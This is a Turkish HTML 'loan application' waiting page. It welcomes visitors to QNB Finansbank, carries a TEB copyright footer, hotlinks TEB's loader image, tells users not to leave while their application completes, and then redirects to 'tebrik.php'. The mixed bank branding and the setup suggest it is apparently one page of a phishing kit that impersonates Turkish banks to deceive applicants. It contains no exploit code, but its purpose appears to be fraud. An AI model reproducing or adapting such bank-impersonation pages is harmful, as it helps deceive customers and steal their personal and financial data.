<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kredi Başvuru Formu</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow-x: hidden;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #FFF; /* Beyaz arka plan */
        }

       header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background-color: rgba(255, 255, 255, 1); /* Beyaz şerit */
            border-top: 4px solid rgb(124, 252, 0); /* Üstte koyu sarı kenar çizgisi */
            border-bottom: 4px solid rgb(124, 252, 0); /* Altta koyu sarı kenar çizgisi */
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: space-between; /* Logo ve TR yazısını sağa ve sola yasla */
            padding: 0 20px; /* İçerik için sağ ve sol boşluk */
        }

        .logo {
            height: 40px; /* Logonun yüksekliği */
            width: auto;
        }

        .tr-text {
            font-size: 18px;
            color: black; /* Yazı rengi siyah */
            text-align: center; /* Yazıyı ortalar */
        }

        .content {
            padding-top: 80px; /* Header yüksekliğine göre içerik boşluğu ayarlandı */
            padding: 0 10px;
            min-height: calc(100vh - 60px);
        }

         .form-container {
    background-color: rgba(255, 255, 255, 0.2);
    padding: 20px;
    border-radius: 8px;
    max-width: 500px;
    margin: 60px auto;
    color: white;
    border: 2px solid rgb(0, 100, 0); /* Daha koyu yeşil çerçeve */
    margin-top: 100px; /* Bu değeri azaltarak formu yukarı alabilirsiniz */
    box-shadow: 0px 6px 20px rgba(0, 70, 0, 0.8); /* Daha koyu yeşil gölgelendirme */
    display: flex;
    flex-direction: column; /* İçerikleri dikey olarak hizalar */
    align-items: center; /* İçerikleri yatay olarak ortalar */
    justify-content: center; /* İçerikleri dikey olarak ortalar */
    text-align: center; /* Metni ortalar */
    height: 600px; /* Yüksekliği artır */
}


        .loading-text {
            font-size: 24px;
            color: black;
        }

        .loading-dots::after {
            content: '';
            display: inline-block;
            animation: dots 1.5s steps(5, end) infinite;
        }

        @keyframes dots {
            0%, 20% {
                content: '';
            }
            40% {
                content: '.';
            }
            60% {
                content: '..';
            }
            80%, 100% {
                content: '...';
            }
        }

        .info-text {
            margin-top: 20px;
            font-size: 18px;
            color: black;
        }
		footer {
    position: fixed;
    bottom: 0;
    width: 100%;
    text-align: center; /* Metni ortalar */
    background-color: rgba(255, 255, 255, 0.2); /* Şeffaf beyaz arka plan */
    padding: 10px 0;
    color: black;
    font-size: 14px;
    display: flex;
    flex-direction: column;
    align-items: center; /* İçeriği yatayda ortalar */
    justify-content: center; /* İçeriği dikeyde ortalar */
}

    </style>
</head>
<body>
    <header>
        <!-- Logo için yer -->
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTWE87A6NFtJrerGLaUfsDVbCR1qaTz1dlSjirorsOa1IwJqCs1knt02z9jANHZpL2mUQ&usqp=CAU" alt="Logo" class="logo">
        <!-- TR yazısı -->
        <div class="tr-text">TR</div>
    </header>
    
    <div class="content">
        <div class="welcome-title">QNB FİNANSBANK'a HOŞGELDİNİZ</div>
        <div class="form-container">
            <div class="loading-text">
                LÜTFEN BEKLEYİNİZ<br><span class="loading-dots"></span>
            </div>
            <br><br>
            <img src="https://www.cepteteb.com.tr/Content/v2/images/ct/TEBLoader.svg" width="170px" height="170px" alt="Bekleyiniz" width="50px">
            <br><br>
            <div class="info-text">
                Başvurunuz Tamamlanıyor <br> Sayfadan Ayrılmayınız
            </div>
        </div>
    </div>

    <footer>
        ©2024. Her hakkı TEB A.Ş.'ye aittir.

    </footer>
	<script>
    setTimeout(function(){
        window.location.href = 'tebrik.php';
    }, 6000); // 6000 milisaniye = 6 saniye
</script>
</body>
</html>
